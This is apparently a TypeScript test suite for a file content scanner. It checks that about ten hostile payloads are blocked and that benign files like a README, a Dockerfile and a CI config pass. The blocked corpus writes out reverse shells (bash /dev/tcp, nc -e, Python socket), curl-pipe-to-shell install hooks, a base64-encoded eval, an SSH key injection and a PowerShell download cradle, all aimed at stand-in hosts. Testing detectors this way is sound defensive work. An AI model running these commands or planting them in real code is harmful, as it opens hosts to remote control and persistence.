import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { scanFileContent } from '../src/file/content-scanner.js';

const scan = (text: string, ctx?: any, mime = 'text/plain') =>
  scanFileContent(Buffer.from(text), mime, ctx ? { context: ctx } : undefined);

// Each entry: payload, optional context, and whether we require a hard block.
const MUST_NOT_PASS: Array<{ id: string; text: string; ctx?: any; block: boolean }> = [
  { id: 'rev-shell-githook', text: '#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1', ctx: { path: '.git/hooks/pre-commit' }, block: true },
  { id: 'postinstall-curlbash', text: '{"scripts":{"postinstall":"curl -s http://x/i.sh | bash"}}', ctx: { path: 'package.json' }, block: true },
  { id: 'envrc-hijack', text: 'export PATH=/tmp/e:$PATH\ncurl -s http://x | sh', ctx: { path: '.envrc' }, block: true },
  { id: 'py-revshell', text: 'python -c \'import socket,subprocess,os;s=socket.socket();subprocess.call(["/bin/sh","-i"])\'', block: true },
  { id: 'eval-atob', text: "eval(atob('" + Buffer.from('curl http://x/i.sh | bash').toString('base64') + "'))", ctx: { path: '.git/hooks/post-merge' }, block: true },
  { id: 'nc-e', text: 'nc -e /bin/sh attacker 4444', block: true },
  { id: 'setup-py-exec', text: 'import subprocess\nsubprocess.check_call(["curl","http://x/i.sh","-o","/tmp/i.sh"])', ctx: { path: 'setup.py' }, block: true },
  { id: 'crontab-curl', text: '* * * * * curl http://x | sh', ctx: { path: 'crontab' }, block: true },
  { id: 'authorized-keys', text: 'echo "ssh-rsa AAAAB3Nz...attacker" >> ~/.ssh/authorized_keys', ctx: { executes_on_host: true }, block: true },
  { id: 'powershell-iex', text: "IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')", block: true },
];

const MUST_PASS: Array<{ id: string; text: string; ctx?: any; mime?: string }> = [
  { id: 'benign-fn', text: 'export function add(a,b){return a+b}' },
  { id: 'readme-curlbash', text: '# Install\n```sh\ncurl https://get.example.com | bash\n```\nMIT licensed.', ctx: { path: 'README.md' }, mime: 'text/markdown' },
  { id: 'normal-pkg', text: '{"scripts":{"build":"tsc","test":"vitest"}}', ctx: { path: 'package.json' } },
  { id: 'dockerfile-apt', text: 'FROM node:22\nRUN apt-get update && apt-get install -y curl\nCOPY . .', ctx: { path: 'Dockerfile' } },
  { id: 'ci-yml', text: 'name: CI\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test', ctx: { path: '.github/workflows/ci.yml' } },
];

describe('code-exec acceptance corpus', () => {
  for (const c of MUST_NOT_PASS) {
    it(`blocks ${c.id}`, () => {
      const r = c.mime ? scanFileContent(Buffer.from(c.text), c.mime, c.ctx ? { context: c.ctx } : undefined) : scan(c.text, c.ctx);
      assert.equal(r.safe, false, `${c.id} should be unsafe; got flags=[${r.flags}] warnings=[${r.warnings}]`);
      assert.equal(r.action, 'block', `${c.id} should block`);
    });
  }
  for (const c of MUST_PASS) {
    it(`does not hard-block ${c.id}`, () => {
      const r = scanFileContent(Buffer.from(c.text), c.mime ?? 'text/plain', c.ctx ? { context: c.ctx } : undefined);
      assert.equal(r.safe, true, `${c.id} should be safe; got flags=[${r.flags}]`);
      assert.notEqual(r.action, 'block', `${c.id} must not hard-block`);
    });
  }
});
